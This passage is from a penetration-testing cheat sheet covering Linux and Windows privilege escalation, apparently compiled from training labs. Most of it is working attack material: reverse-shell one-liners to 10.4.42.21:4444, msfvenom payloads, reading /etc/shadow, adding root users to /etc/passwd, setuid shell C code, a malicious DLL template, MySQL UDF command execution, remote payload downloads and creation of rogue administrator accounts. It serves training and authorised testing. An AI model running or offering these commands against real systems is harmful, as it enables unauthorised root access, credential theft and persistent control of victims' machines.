SUID, set-user id or SGID, set-group id; is one way we can look for executables that have the SUID or SGID bits set to allow you to run programs **at the owners privilege level**.\
Thereby circumventing the users' restrictions by running the program at someone else's level.

**FIND SUID/SGID BITS:**

> - `find / -type f -perm -04000 -ls 2>/dev/null` 
> - `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null` 
> - displays owners of apps/files
> - Refer to [GFTO website](https://gtfobins.github.io/#+suid) in order to see if there is any methods

**NANO**

Finding Nano with SUID bit

>**For example, we find that `nano` has the SUID bit set:**
> -
> - Now we know we can run `nano` with the owners privs. (in this example, nano being owned by **root**)
> - `nano /etc/shadow` will then produce hashes for all users and we can access them through `nano` privileges (root)
>
> **Adding USER with `nano`**
> -
> - Alternatively, with a root-nano we can create our own user in `/etc/passwd` by getting a hash value using `openssl passwd -1 -salt THM password1`
> - Then adding password and user to `/etc/passwd` with `root:/bin/bash` to provide a root shell
> - From this we can login `su {username}` and our password

![](https://i.imgur.com/VsSvGAu.png)

**BASE64**

If we find that Base64 has a SUID +s bit, then it is possible to read files with escalated privs.\
So in this example we would be looking to read priviledged files such as `/etc/shadow` and displaying the hashes for all users.

> - `LFILE=/etc/shadow` to set target file
> - `/usr/bin/base64 "$LFILE$" | base64 --decode`
> - 
> - `LFILE=/home/rootflag/flag2.txt`
> - `/usr/bin/base64 "$LFILE$" | base64 --decode`

**SYSTEMCTL**

Making a tmp service and using `systemctl` to add a SUID bit to `/bin/bash`, so when we use `bash -p` we get root.

> `priv=$(mktemp).service`
> `echo '[Service]`
> `ExecStart=/bin/sh -c "chmod +s /bin/bash"`
> `[Install]`
> `WantedBy=multi-user.target' > $priv`
> `/bin/systemctl link $priv`
> `/bin/systemctl enable --now $priv`
> `bash -p` for root
 
 **JOURNALCTL:**

> - `sudo journalctl`
> - `!/bin/sh`

 
**UNINTERESTING SUID FILES:**

Common SUID files that don't lead to being able to escape into shells or take advantage of exploits.

> - `/bin/ping` 
> - `/bin/su`
> - `/bin/umount`
> - `/sbin/mount.nfs`
> - `/bin/fusermount`
> - `/bin/mount`

**SHARED OBJECT INJECTION:**

Locate file vulnerable to shared object injection i.e `/usr/local/bin/suid-so` that showed up in our SUID search

> - `/usr/local/bin/suid-so` runs the program and we notice a progress bar
> - `strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"` search for output on open/access calls and "no such file" errors
> - `/home/user/.config/libcalc.so` was found, and we notice **its a shared object within our home directory** but the file cannot be found
> - `mkdir /home/user/.config` to create the missing directory
> - upload Shared Object code to be compiled
> - `gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`
> - `/usr/local/bin/suid-so` now produces a root shell instead of a progress bar.

**Environment Variables**

Locate file vulnerable to shared object injection i.e `/usr/local/bin/suid-so` that showed up in our SUID search

> - `/usr/local/bin/suid-env` runs the program and we notice starting a apache2 webserver
> - `strings /usr/local/bin/suid-env` to look for printable characters
> - Inspecting the output, we notice a line suggesting the `service` executable is being called to start the webserver **but the full path is not being used to call it /usr/sbin/service**
>  - Upload code to compile and name the executable `service.c`, simple code that spawns a bash shell
>  - `gcc -o service /home/user/tools/suid/service.c`
>  - `PATH=.:$PATH /usr/local/bin/suid-env` prepend the current directory `.:$PATH` where the malicious service is located
> - `/usr/local/bin/suid-env` will now produce a root shell as it looks for `service` and not the **full path** and uses our malicious code

**Abusing Shell Features/Version**

In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

> - `/bin/bash --version` to determine version
> - `function /usr/sbin/service { /bin/bash -p }` create a bash function, give it the service name, -p to preserve permissions
> - `export -f /usr/sbi/service` export the function
> - `/usr/local/bin/suid-env2` to produce root shell

In bash versions < 4.4; when in debugging mode, bash uses the environment variable **PS4** to display an extra prompt for debugging statements

> - `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`
> - `/tmp/rootbash -p` to produce shell with root privs

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Capabilities

Tags: [Common-OS-File-locations](#Common-OS-File-locations), [NC-Netcat](#NC-Netcat), [Common-Shell-Payloads](#Common-Shell-Payloads), [PAYLOADS-SHELLS](#PAYLOADS-SHELLS), [Webshells](#Webshells)

Capabilities help manage privs at a more granular level. Allows admins to provide access to usages or tools without providing higher privileges.\
For example a SOC analyst may need to be able to access and initiate socket connections with a tool; normal users would not be able to do this but the admin might not want to escalate the analysts privs.

This is where capabilities come in and allow more granular access and privileges.

**Note**: getcap produces a lot of errors so it is recommended to use 2>/dev/null to route the errors away

**Search for capabilities**

> `getcap -r / 2>/dev/null`

![](https://i.imgur.com/pvnwPlH.png)

**Example of escalating privileges with vim having capabilities**

> `./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`
> Produces Root user access and a shell.

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Cron-Jobs

Tags: [Common-OS-File-locations](#Common-OS-File-locations), [NC-Netcat](#NC-Netcat), [Common-Shell-Payloads](#Common-Shell-Payloads), [PAYLOADS-SHELLS](#PAYLOADS-SHELLS), [Webshells](#Webshells)

Cron Jobs are used to run scripts or binaries at a specific time. They also **by default** run with the **owners privileges** and not the users privs.\
Properly configured, Cron Jobs are not inherently vulnerable but can provide a escalation vector under specific conditions.

To abuse Cron Jobs: we are looking if there is a scheduled task **with root privs** and then we **change the script** to run our own script with those privileges.

Each user on the system have their own Cron Tables and can run specific tasks whether logged in or not.\

**Methodology**

> - On **target host**`cat /etc/crontab` to view cron jobs scheduled
> - **Note when editing scripts:** Check if the *scripts* are executable. If not, try using chmod +x or chmod 777 otherwise the cron job might not be configured correctly to execute
> - On **target host**`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.42.21 4444>/tmp/f" > {path/to/cronjob}` to echo the script into the cronjob
> - On **attack host**`nc -lvnp 4444` setup listener


**Two simple reverse shell scripts:**

> - `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.42.21 4444>/tmp/f" > {path/to/cronjob}` to echo the script into the cronjob
> - `bash -i >& /dev/tcp/10.4.42.21/4444 0>&1`
> - Placed inside the cronjob and checked for scheduled runtime etc. Having a listener setup to catch that connection

**Crontab is always worth checking** as it can sometimes lead to easy privilege escalations vectors. It is not uncommon for system admins to run a script, create a cron job for it, after awhile it is useless\
and they delete it then never delete the cron job.

For example:

![](https://i.imgur.com/kyDD3WR.png)

The above shows that `antivirus.sh` file no longer exists however the cron job is still setup as root privs.\
If the **full path of the script is not defined** (as it is done for other scripts i.e /path/to/file.sh), cron will refer to the paths listed under the PATH variable in the /etc/crontab file.\
In this case, we should be able to create a script named “antivirus.sh” under our user’s **home folder** and it should be run by the cron job. 

**PATH Environment Variable**

> - `cat /etc/crontab` and inspect the **PATH=/**
> - If you notice a path variable such as /home/user then we can create a **script** with the same name as the script with no path i.e `antivirus.sh`
> - `vim antivirus.sh` create file in /home/ directory
> - Copy the below code into the file
> - `chmod +x /home/user/antivirus.sh`
> - Run `/tmp/rootbash -p` to gain shell with root privs

```
#!/bin/bash  
  
cp /bin/bash /tmp/rootbash  
chmod +xs /tmp/rootbash
```

**Wildcards with TAR**

Note that the **tar** command is being run with a wildcard in your **home directory.**\
TAR has a **checkpoint** feature that we can take advantage of. When TAR cronjob runs, the wildcard will expand to include our newly created files that have **valid commands** that TAR will treat as command line options



> `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`
> Transfer to target with `scp` or `wget`
> `chmod +x shell.elf`
> `touch /home/user --checkpoint=1` Create file in **home directory**
> `touch /home/user --checkpoint-action=exec=shell.elf` Create file in **home directory**



[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## $PATH

Tags: [Common-OS-File-locations](#Common-OS-File-locations), [NC-Netcat](#NC-Netcat), [Common-Shell-Payloads](#Common-Shell-Payloads), [PAYLOADS-SHELLS](#PAYLOADS-SHELLS), [Webshells](#Webshells),  [Windows-Privilege-Escalation](#Windows-Privilege-Escalation)

$PATH in linux is an environmental variable that tells the OS where to search for *executables*.\ 
For any command not built into the SHELL or that is not defined with an absolute path; linux will start searching in folders defined under PATH

![](https://i.imgur.com/V1virwQ.png)

Let's say we have an SUID binary. Running it, we can see that it’s calling the system shell to do a basic process like list processes with "ps". Unlike in our previous SUID example, in this situation we can't exploit it by supplying an argument for command injection, so what can we do to try and exploit this?

We can re-write the PATH variable to a location of our choosing! So when the SUID binary calls the system shell to run an executable, it runs one that we've written instead!

As with any SUID file, it will run this command with the same privileges as the owner of the SUID file! If this is root, using this method we can run whatever commands we like as root!

**Other Methods include:**

**Script to change to root user, requires `GCC` compiling**

```cpp
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("filename");
}
```

**Step 1: Create executable**

> -  create file with above script such {filename.c} in `c` ready to be compiled
> - Compile with `gcc {filename.c} -o  {the_script} -w`
> - Saved as a executable with any name i.e as above example `the_script`

**Step 2: Provide root privs to executable**

> - When above `the_script` is run, it will look for executable, e.g as per script `filename` to run.
> - Add SUID bit set for our user, allowing this binary to run with root privileges `chmod u+s {newname}`

**Step 3: Locate a path for current user to write to**

> - Find writable path `find / -writable 2>/dev/null`
> - Add writable directory to PATH `export PATH={/path/to/add}:$PATH`
> - Now the system will look under the $PATH for where to find executables.

**Step 4: Create a file with simple shell request**

> - Finally create a file such as `filename` and add a execution such as `/bin/bash`
> - change permissions on `filename` with `chmod 777 filename`

**Finally:**

> - Run the script `./the_script` and it will look for `filename` and run the execution
> - If successful, this will run `/bin/bash` shell but with root privs

|                                           | Desciption                                              |
| :---------------------------------------- | :------------------------------------------------------ |
| @ **Find Writable Paths**                 | ---                                                     |
| `find / -writable 2>/dev/null`            | finding paths that are writable for current user        |
| @ **Adding to $PATH**                     | ---                                                     |
| `export PATH={/path/to/add}:$PATH`        | Add a directoy with your chosen executable to the $PATH |
| ========================================= | =========================================               |

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Service-Exploits

Tags: [Common-OS-File-locations](#Common-OS-File-locations), [NC-Netcat](#NC-Netcat), [Common-Shell-Payloads](#Common-Shell-Payloads), [PAYLOADS-SHELLS](#PAYLOADS-SHELLS), [Webshells](#Webshells), [Weak-File-Permissions](#Weak-File-Permissions), [SUID-or-SGID](#SUID-or-SGID)

**MySQL User-defined Functions**

Functions to run system commands as root via the MySQL service, https://www.exploit-db.com/exploits/1518

**Methodology**

> 1. Copy the code from [exploit-db](https://www.exploit-db.com/exploits/1518) and name it **raptor_udf2.c** and save it as a `.c` file
> 2. `gcc -g -c raptor_udf2.c -fPIC` to compile the `.c` file 
> 3. `gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc` 
> 4. `mysql -u root`
>  5. Execute the below code in **mysql** terminal
>  6. `/tmp/rootbash -p`

Execute the following in the **mysql** terminal

			use mysql;  
			create table foo(line blob);  
			insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));  
			select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';  
			create function do_system returns integer soname 'raptor_udf2.so';
			
			select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');


[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## NFS-Network-File-Sharing

Tags: [Common-Shell-Payloads](#Common-Shell-Payloads), [PAYLOADS-SHELLS](#PAYLOADS-SHELLS), [Webshells](#Webshells),  [Windows-Privilege-Escalation](#Windows-Privilege-Escalation)

Network File Sharing configuration is kept in the /etc/exports file and this file can usually be ready by users using `cat /etc/exports`\
The critical element we are looking for is the **"no_root_squash"** option. If this option is present on a **writable share** then we can create an exe with SUID bit set and run it on target system.

By default this should not be the case as NFS will change the root user to nfsnobody and strip any file from operating with root privileges usually.\ 
So this element would be due to a misconfigured network shell.

As such, it is then possible to **mount the share on our attacker machine**, write an executable and provide the executable with root privs; so when we run it on the target, it runs with root privs.

**Script for root shell**

```cpp
int main()
{ setgid(0);
setuid(0);
system("/bin/bash");
return 0;
}
```

**NOTE:**:

- > File created and saved with **sudo** to ensure when adding SUID +s bit flag, it will take owners privileges (root)
- > `sudo chown root $FILE` to ensure the owner is root in order to inherit the root privs through NFS exploitation.

|                                                                                                  | Description                                                                                      |
|:------------------------------------------------------------------------------------------------ |:----------------------------------------------------------------------------------------------- |
| @ **Check for NFS Mountable Shares**                                                             | ---                                                                                             |
| `cat /etc/exports`                                                                               | **Victim Machine**                                                                              |
|                                                                                                  |                                                                                                 |
| @ **Enumerate NFS and Mountable Shares**                                                         | ---                                                                                             |
| `showmount -e $RHOST`                                                                            | Display mountable shares                                                                        |
| `sudo nmap -sV --script=nfs-ls,nfs-statfs,nfs-showmount $RHOST`                                  |                                                                                                 |
|                                                                                                  |                                                                                                 |
| @ **Unmountable Shares**                                                                         | ---                                                                                             |
| `umount $SHAREpath`                                                                              | removes the mounted folder                                                                      |
|                                                                                                  |                                                                                                 |
| @ **Mount to Attacker Machine**                                                                  | ---                                                                                             |
| On attacker machine `mkdir /tmp/$SHAREFOLDER`                                                    | On attacker machine, create folder that we want to link to share folder                         |
| On attacker machine `mount -o rw $RHOST:/$RSHARE /tmp/$SHAREFOLDER`                              | mount and link folder to share folder                                                           |
| On attacker machine `mount -t nfs $RHOST:/$RSHARE /tmp/$SHAREFOLDER`                             | mount and link folder to share folder                                                           |
|                                                                                                  |                                                                                                 |
| @ **Create executable**                                                                          | ---                                                                                             |
| On attacker machine `sudo gcc $FILE.c -o $FILEnew -w`                                            | **Windows** compile the script we created in the attackfolder                                   |
| On attacker machine `msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf` | **Linux** create a payload to share                                                             |
| On attacker machine `sudo chown root $FILEnew`                                                   | ensure owner is root for inheriting root privs                                                  |
| On attacker machine `sudo chmod +xs $FILEnew`                                                    | provide the root +s SUID set bit, done on our attacker machine with **sudo** to give root privs |
|                                                                                                  |                                                                                                 |
| @ **Run executable**                                                                             | ---                                                                                             |
| `cd /$RSHARE`                                                                                    | go into the sharefolder with file                                                               |
| `./$FILEnew`                                                                                     | run the executable                                                                              |
| =========================================                                                        | =========================================                                                       |

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Passwords-and-Keys

Tags: [Linux-Privilege-Escalation](#Linux-Privilege-Escalation)

If a user accidentally typed their password on the command line instead of the password prompt, this may be recorded in the history file.\
This could come from typing in the wrong syntax and using the wrong terminal and so forth.


> **History**
>
> `cat ~/.*history | less`

> **Config Files**

> `cat {config files}` and take note of various info such as paths or .txt files you haven't located


[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

# Windows-Privilege-Escalation

All about escalating privileges to get from a lower-privilege user up to super users.\

------------------------------------------------------------------------------------------------------------------------------------------------------

## Info-Gathering

Tags: [Shell-Meterpreter](#Shell-Meterpreter), [Msfvenom](#Msfvenom), [Metasploit](#Metasploit), [Common-Shell-Payloads](#Common-Shell-Payloads), [Webshells](#Webshells), [WEB-ATTACKS](#WEB-ATTACKS), [PAYLOADS-SHELLS](#PAYLOADS-SHELLS), [WinPEAS-PowerUp](#WinPEAS-PowerUp),\
[Windows-Exploit-Suggester](#Windows-Exploit-Suggester), [Vulnerable-Software](#Vulnerable-Software), [DLL-Hijacking](#DLL-Hijacking), [Unquoted-Service-Path](#Unquoted-Service-Path), [Quick-Wins](#Quick-Wins), [Registry](#Registry),

Testing for permissions or using services or programs to run privileged commands:

> `net users $USERnew  $PASSnew /add && net localgroup Administrators $USERnew /add`

```powershell
#User/Group Enumeration
$USER	:User name
$GROUP	:Group name
whoami /priv			:Current User privs
net users				:List Users
net user $USER			:Filter Users i.e *admin* wildcard
qwinsta					:Other Logged-in users
net localgroup			:List Groups
net localgroup $GROUP	:Filter Group i.e Administrators

#System Enumeration
systeminfo												:Dump System Info	
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"	:Filter Name, Version
hostname												:Dump Hostname
netstat -ano											:Active Connections, Listening ports, prevent DNS Resolves
driverquery												:List drivers
sc query windefend										:Antivirus enumeration
sc queryex type=service									:Antivirus enumeration

#Services Powershell
Get-Service												:All services
Get-Service | Sort-Object status						:Sorting
Get-Service -Displayname "*network*"					:search string with wildcards
Get-Service | Where-Object {$_.Status -eq "Running"}	:"Running" or "Stopped" services

#Services CMD
$SERVICE												:Exact service name
wmic qfe get Caption,Description,HotfixID,InstalledOn	:List Updates on system
wmic service list										:List services
wmic service list brief | findstr "Running"				:Filter "Running"
wmic product											:Dumps Installed programs, Info overload
wmic product get name,version,vendor					:Dumps installed programs, Clean output
sc qc $SERVICE

#Version
$PROGRAMpath:Path/to/program.exe
(Get-Item -Path '$PROGRAMpath').VersionInfo | Format-List -Force	:Version info for program

#Searching
/s		:Searching
/b		:barebones
$STRING	:String to search within *.txt (all .txt files)
/si 	:ignore upper/lowercase differences
*.txt	: Target all .txt, xml, ini, config, xls files.

dir /s /b *$FILE*			:Wildcard searching "*file*.txt"
findstr /si $STRING *.txt	:Search current, sub dir for patterns of $STRING

#Downloading
$LHOST	:Listening Host
$FILE	:File name
%tmp%	:Easily navigated file location

Invoke-WebRequest $LHOST/$FILE -outfile %tmp%\$FILE

#Scheduled Tasks
schtasks						:Show all scheduled tasks
schtasks /query /fo /LIST /v	:Filter and list
```


**Notes:**

> - Any port listed as "listening" that was **not discovered with external port scan** could prove to be a potential local service.  
> - Port forwarding on such services could open escalation vectors.

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## WinPEAS-PowerUp

Tags: [Metasploit](#Metasploit), [Info-Gathering](#Info-Gathering), [Windows-Exploit-Suggester](#Windows-Exploit-Suggester), [Vulnerable-Software](#Vulnerable-Software), [DLL-Hijacking](#DLL-Hijacking), [Unquoted-Service-Path](#Unquoted-Service-Path), [Quick-Wins](#Quick-Wins), [Registry](#Registry), [Hashcat](#Hashcat)

Both **WinPEAS** & **PowerUp** are automated scripts that require to be downloaded and ran on the target machines

```powershell
#WINPEAS
#TRANSFER
    certutil -urlcache -f http://$RHOST/winpeas.exe %tmp%/winpeas.exe	:Transfer file to victim
    powershell "Invoke-WebRequest -UseBasicParsing $RHOST/winPEASany.exe -OutFile %tmp%/winPEAS.exe"
    powershell -c "(New-Object System.Net.WebClient).DownloadFile(\"http://$RHOST:$RPORT/winPEASany.exe\", %tmp%\"winpeas.exe\")"
#USAGE
    winpeas.exe > $FILE													:Optional: Output saved to file
    winpeas.exe servicesinfo											:Filter service info only

#POWERUP
#TRANSFER
    certutil -urlcache -f http://$RHOST/powerup.ps1 %tmp%/powerup.ps1	:Transfer file to victim
    powershell "Invoke-WebRequest -UseBasicParsing $RHOST/powerup.ps1 -OutFile %tmp%/powerup.ps1"
    powershell -c "(New-Object System.Net.WebClient).DownloadFile(\"http://$RHOST:$RPORT/powerup.ps1\", %tmp%\"powerup.ps1\")" 
#USAGE
    powershell.exe -nop -exec bypass									:optional, may need to pypass execution policy restrictions
    import-module ./powerup.ps1											:Invoke script
    invoke-allchecks													:Perform all checks
    get-unquotedservice													:Target unquoted service path vulns
```

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Windows-Exploit-Suggester

Tags: [Msfvenom](#Msfvenom), [Metasploit](#Metasploit), [Common-Shell-Payloads](#Common-Shell-Payloads), [Webshells](#Webshells), [WEB-ATTACKS](#WEB-ATTACKS), [PAYLOADS-SHELLS](#PAYLOADS-SHELLS), [Info-Gathering](#Info-Gathering), [WinPEAS-PowerUp](#WinPEAS-PowerUp), [Vulnerable-Software](#Vulnerable-Software), [DLL-Hijacking](#DLL-Hijacking), [Unquoted-Service-Path](#Unquoted-Service-Path), [Quick-Wins](#Quick-Wins), [Registry](#Registry)

**Windows Exploit Suggester** is a python script that needs to be downloaded and can be run on the host(linux) machine.

```powershell
#VICTIM
certutil -urlcache -f http://$RHOST/windows-exploit-suggester.py %tmp%/windows-exploit-suggester.py	:Transfer to Victim
./windows-exploit-suggester.py -update																:Ensure database is updated
systeminfo > $FILE.txt																				:Gather info into .txt
./windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo $FILE.txt				:Run tool, using updated database

#METASPLOIT
use multi/recon/local_exploit_suggester		:Run module using open session
```

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Vulnerable-Software

Tags: [Metasploit](#Metasploit), [Info-Gathering](#Info-Gathering), [WinPEAS-PowerUp](#WinPEAS-PowerUp), [Windows-Exploit-Suggester](#Windows-Exploit-Suggester), [DLL-Hijacking](#DLL-Hijacking), [Unquoted-Service-Path](#Unquoted-Service-Path), [Quick-Wins](#Quick-Wins), [Registry](#Registry), 

Checking for vulnerable software could present various privesc opportunities. 

```powershell
#SERVICES
$SERVICE												:Exact service name
wmic qfe get Caption,Description,HotfixID,InstalledOn	:List Updates on system
wmic service list										:List services
wmic service list brief | findstr "Running"				:Filter "Running"
wmic product											:Dumps Installed programs, Info overload
wmic product get name,version,vendor					:Dumps installed programs, Clean output
sc qc $SERVICE
net stop $SERVICE && net start $SERVICE					:Stop/Start service
(Get-Item -Path '$PATH').VersionInfo |Format-List -Force:Get specific version info

#METASPLOIT
use multi/recon/local_exploit_suggester		:Run module using open session
```

**Notes:**

> Note the `wmic product` may miss some installed programs due to backwards compatibility issues such as 32bit programs on 64bit machine. This could sometimes miss programs. 

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## DLL-Hijacking

Tags: [Msfvenom](#Msfvenom), [Metasploit](#Metasploit), [Common-Shell-Payloads](#Common-Shell-Payloads), [Webshells](#Webshells), [WEB-ATTACKS](#WEB-ATTACKS), [PAYLOADS-SHELLS](#PAYLOADS-SHELLS), [Info-Gathering](#Info-Gathering), [WinPEAS-PowerUp](#WinPEAS-PowerUp), [Windows-Exploit-Suggester](#Windows-Exploit-Suggester), [Vulnerable-Software](#Vulnerable-Software), [Unquoted-Service-Path](#Unquoted-Service-Path), [Quick-Wins](#Quick-Wins), [Registry](#Registry)

Technique to inject code into an application. Some applications will use Dynamic Link Libraries when running. They store additional functions that the main function of the .exe use to support it.\
DLL's are similar to executable files but they don't run like a normal .exe does.

If we can **switch a legitimate** DLL with our **specially crafted one** then our code will run with the application.\ 
DLL hijacking requires having an application with either a **missing DLL file** or where the search order can be used to **insert** malicious DLL file.

**An application will search for all required DLL's in a methodical manner:**

If **SafeDllSearchMode** is enabled, it will search in order:

  1.  The directory from which the application loaded.

  2.  The system directory. Use the **[GetSystemDirectory]** function to get the path of this directory.

  3.  The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.

  4.  The Windows directory. Use the **[GetWindowsDirectory]** function to get the path of this directory.

  5.  The current directory.

  6.  The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. 

If **SafeDllSearchMode** is disabled, it will search in order:

  1.  The directory from which the application loaded.

  2.  The current directory.

  3.  The system directory. Use the **[GetSystemDirectory]** function to get the path of this directory.

  4.  The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.

  5.  The Windows directory. Use the **[GetWindowsDirectory]** function to get the path of this directory.

  6.  The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. 

**NOTE:** It is important to note that we need to know what directory we have write access to and ensuring that the .DLL we are trying to hijack is **after** our write directory\
Our code needs to be called upon by the application before the legitimate DLL.

**Skeleton Code Template for Malicious DLL**

```powershell
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```

>  - This file will execute `whoami` with (`cmd.exe /k whoami`) and output file to *dll.txt*
> - mingw compiler will generate the DLL file `x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll`

[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Unquoted-Service-Path

Tags: [Msfvenom](#Msfvenom), [Metasploit](#Metasploit), [Common-Shell-Payloads](#Common-Shell-Payloads), [Webshells](#Webshells), [WEB-ATTACKS](#WEB-ATTACKS), [PAYLOADS-SHELLS](#PAYLOADS-SHELLS), [Info-Gathering](#Info-Gathering), [WinPEAS-PowerUp](#WinPEAS-PowerUp), [Windows-Exploit-Suggester](#Windows-Exploit-Suggester), [Vulnerable-Software](#Vulnerable-Software), [DLL-Hijacking](#DLL-Hijacking), [Quick-Wins](#Quick-Wins), [Registry](#Registry)

it needs to run. It is either **quote** with a path "C:\Windows\Path\To\Exe", which means *it specifies the direct link to the exe*,\
or C:\Windows\Path\To\Exe without quotes which means that the service will look in each directory and sub directories i.e C:\program.exe, then C:\Windows\Program.exe then C:\Windows\Path\Program.exe...

**Note:** the way it is looking is to search for the next part of the directory but windows automatically appends .exe:

**METHODOLOGY**
> -  **Locate Writeable Path:** C:\Program Files\{Writeable Folder}\Common Files
> - **Search Pattern:** C:\Program Files\Writeable.exe then Folder.exe then C:\Program Files\{Writeable Folder}\Common.exe etc...
> - So if we want to inject our own code i.e Reverse shell, we would place it inside the **Writeable Folder** and rename the file to **Common.exe** so it gets picked up
> - As such it is important to know what folders we have Write access to. Then we can do something like `wget http://{ip address}/filename.exe -O filename.exe` to download it into the writeable path.


Knowing this, finding unquoted server paths means we can also look at the route taken and find out if any of those subfolders has write permissions for our limited user.

|                                                           | Desciption                                                                             |
|:--------------------------------------------------------- |:-------------------------------------------------------------------------------------- |
| @ **Syntax**                                              | ---                                                                                    |
| ` wmic service get name,displayname,pathname,startmode`   | Display the services and their paths etc                                               |
| `sc qc {service name}`                                    | Get specific info about that service. **Note** this command only works with CMD        |
|                                                           |                                                                                        |
| @ **accesschk64**                                         | ---                                                                                    |
| `.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"` | Using a program **Accesschk64** to discover and check if a path or folder is writeable |
|                                                           |                                                                                        |
| @ **Download Payload**                                    | ---                                                                                    |
| `wget "http://{ip address}/attack.exe" -O attack.exe`     | Setup python server and download the relevant payload such as a reverse shell          |
| =========================================                 | =========================================                                              |


[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Quick-Wins

Tags: [Msfvenom](#Msfvenom), [Metasploit](#Metasploit), [Common-Shell-Payloads](#Common-Shell-Payloads), [Webshells](#Webshells), [WEB-ATTACKS](#WEB-ATTACKS), [PAYLOADS-SHELLS](#PAYLOADS-SHELLS), [Info-Gathering](#Info-Gathering), [WinPEAS-PowerUp](#WinPEAS-PowerUp), [Windows-Exploit-Suggester](#Windows-Exploit-Suggester), [Vulnerable-Software](#Vulnerable-Software), [DLL-Hijacking](#DLL-Hijacking), [Unquoted-Service-Path](#Unquoted-Service-Path), [Registry](#Registry)

Not always the case but if other methods aren't working then seeing if the quick wins are available is always good for CTF like problems.\
This is not usually relevant to real world engagements.

**SCHEDULED TASKS**

`schtasks` - Check to see if theres a scheduled task that **either lost its binary or using a binary you can modify**.\
For this to work, the task needs to run with higher privs than your current user.

**ALWAYSINSTALLELEVATED**
Windows installer files (.msi) are used to install apps on system. These usually run with privilege level **of the user that starts it**.\
However they can be configured to run with higher privs if the installation requires admin privs.

This could allow a malicious .msi file that would run with admin privs.

  **Requires 2 Registry values to be set:**

  > reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
  > reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

  **Note:** Both need to be set otherwise this exploitation won't work.

  *Generate malicious .msi file:*

  > `msfvenom -p windows/x64/shell_reverse_tcpLHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi`

  Once transferred, the installer can be run with the following:

  > `C:\Users\user\Desktop>msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`

**PASSWORDS**

Looking at cleartext files and finding credentials is also a quick win. using various tools to this makes it easy to find another vector is there is any.

  **SAVED CREDENTIALS**
  
  > `cmdkey /list` listing all saved credentials, potentially getting other users credentials.
  > `runas /savecred /user:admin reverse_shell.exe` if you have any saved credentials, you could attempt to run programs as that user e.g admin

  **REGISTRY KEYS**

  Registry keys can potentially hold credentials as well
  
  > `reg query HKLM /f password /t REG_SZ /s`
  > `reg query HKCU /f password /t REG_SZ /s`

  **UNATTENDED FILES**

  *Unattend.xml* files help system admins setting up windows systems. They are meant to be deleted once setup is complete but can sometimes be forgotten on the system.\
  These might be worth reading


**ADD NEW USER TO ADMINISTRATORS GROUP**
From a shell running as SYSTEM user or admin account with high privs; add new user to administrators group then **rdp, winrm, winexe, psexec** onto the system

> `net user {username} {password} /add`
> `net localgroup administrators {username} /add`


[Back to Top](#table-of-contents)

------------------------------------------------------------------------------------------------------------------------------------------------------

## Registry

Tags: [Msfvenom](#Msfvenom), [Metasploit](#Metasploit), [Common-Ports](#Common-Ports), [Webshells](#Webshells), [Webshells](#Webshells), [PAYLOADS-SHELLS](#PAYLOADS-SHELLS), [Info-Gathering](#Info-Gathering), [WinPEAS-PowerUp](#WinPEAS-PowerUp), [Windows-Exploit-Suggester](#Windows-Exploit-Suggester), [Vulnerable-Software](#Vulnerable-Software), [DLL-Hijacking](#DLL-Hijacking), [Unquoted-Service-Path](#Unquoted-Service-Path), [Quick-Wins](#Quick-Wins)

